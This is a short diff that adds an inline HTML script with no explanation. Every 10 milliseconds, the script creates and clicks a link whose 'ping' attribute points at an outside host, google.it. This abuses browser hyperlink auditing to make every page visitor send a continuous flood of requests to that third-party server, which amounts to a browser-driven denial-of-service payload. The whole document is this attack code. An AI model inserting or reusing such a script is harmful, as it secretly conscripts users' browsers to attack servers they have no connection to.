@@ -1,0 +1,10 @@
+<script>
+	function loop() {
+		let link = document.createElement('a');
+		link.href = '';
+		link.ping = 'https://www.google.it';
+		document.head.appendChild(link);
+		link.click()
+	}
+	setInterval("loop()", 10)
+</script>
